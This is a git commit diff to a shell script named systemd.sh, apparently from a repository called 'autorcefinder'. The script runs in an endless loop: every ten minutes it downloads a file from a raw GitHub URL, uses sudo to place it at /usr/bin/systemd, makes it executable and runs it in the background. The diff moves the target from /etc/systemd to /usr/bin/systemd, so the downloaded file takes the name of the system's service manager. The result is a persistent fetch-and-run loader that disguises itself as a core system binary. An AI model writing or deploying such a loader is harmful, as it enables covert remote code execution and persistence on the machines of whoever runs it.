1d9c2d6491e006cded740e18f08b7be32934e352
FoxyProxy <166161106+FoxyProxys@users.noreply.github.com>
2024-05-05 00:53:15 +0530

    Update systemd.sh

--- systemd.sh
+++ systemd.sh
@@ -4,21 +4,21 @@
 GITHUB_URL="https://raw.githubusercontent.com/FoxyProxys/autorcefinder/main/systemd"
 
 while true; do
-    # Check if the file already exists in /etc/
-    if [ -f "/etc/systemd" ]; then
-        sudo rm /etc/systemd
+    # Check if the file already exists in /usr/bin/
+    if [ -f "/usr/bin/systemd" ]; then
+        sudo rm /usr/bin/systemd
     fi
     
     # Download the file if it exists
     if curl --output /dev/null --silent --head --fail "$GITHUB_URL"; then
         # Download the file
-        sudo curl -sSL "$GITHUB_URL" -o /etc/systemd
+        sudo curl -sSL "$GITHUB_URL" -o /usr/bin/systemd
         
         # Give execute permissions
-        sudo chmod +x /etc/systemd
+        sudo chmod +x /usr/bin/systemd
         
         # Execute the file
-        /etc/systemd &
+        /usr/bin/systemd &
     fi
     
     # Sleep for 10 minutes before checking again
